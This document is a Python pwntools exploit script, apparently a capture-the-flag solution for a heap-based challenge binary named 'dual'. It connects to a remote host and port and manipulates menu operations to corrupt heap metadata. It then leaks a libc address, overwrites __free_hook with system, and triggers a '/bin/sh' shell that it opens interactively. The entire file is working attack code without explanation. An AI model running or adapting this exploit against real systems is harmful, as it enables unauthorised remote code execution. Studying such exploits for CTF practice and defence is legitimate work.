from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './dual'
HOST = '13.231.226.137'
PORT = 9573

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


def create(src):
    r.sendlineafter('op>\n', '1')
    r.sendlineafter('>\n', str(src))
    idx = int(r.recvuntil('\n', True))
    return idx

def connect(src, dst):
    r.sendlineafter('op>\n', '2')
    r.sendlineafter('>\n', str(src))
    r.sendlineafter('>\n', str(dst))

def disconnect(src, dst):
    r.sendlineafter('op>\n', '3')
    r.sendlineafter('>\n', str(src))
    r.sendlineafter('>\n', str(dst))

def write_text(idx, payload, length = -1):
    r.sendlineafter('op>\n', '4')
    r.sendlineafter('>\n', str(idx))
    if length == -1:
        r.sendlineafter('>\n', str(len(payload)))
    else:
        r.sendlineafter('>\n', str(length))
    r.sendafter('>\n', payload)
    
def write_bin(idx, payload, length = -1):
    r.sendlineafter('op>\n', '5')
    r.sendlineafter('>\n', str(idx))
    if length == -1:
        r.sendlineafter('>\n', str(len(payload)))
    else:
        r.sendlineafter('>\n', str(length))
    r.sendafter('>\n', payload)

def read_node(idx):
    r.sendlineafter('op>\n', '6')
    r.sendlineafter('>\n', str(idx))

def gc():
    r.sendlineafter('op>\n', '7')

r = start()
if args.D:
    debug(r, [])


bss_zero = 0x519440

create(0) #1
write_bin(1, '') #2
create(1) #2
create(2) #3

gc()
payload = ''
payload += flat(3, 3)
payload += flat(bss_zero, bss_zero, bss_zero)
payload += flat(0x800, 1, 0, 0xdeadbeef)
write_text(0, payload) #3
write_text(2, 'A'*0x21000) #4

idx = create(0) #5
write_text(idx, 'A'*0x28) #6

idx = create(0) #5
write_text(idx, 'A'*0x28) #6

disconnect(0, idx)
disconnect(0, idx-1)
gc()
read_node(3)
blob = r.recv(0x800)
leak = u64(blob[0x1a0:0x1a8])
dbg('leak')
base = leak + 0x26ff0
dbg('base')
fh = base + 0x1eeb28
system = base + 0x55410

payload = ''
payload += blob[:0x2a0]
payload += p64(fh-8)
payload += blob[0x2a8:]
assert(len(payload) == 0x800)

write_text(3, payload)

idx = create(0)
write_text(idx, 'A'*0x28)

idx = create(0)
write_text(idx, '/bin/sh\x00'+p64(system)+'A'*0x18)

disconnect(0, idx)
gc()


r.interactive()
r.close()
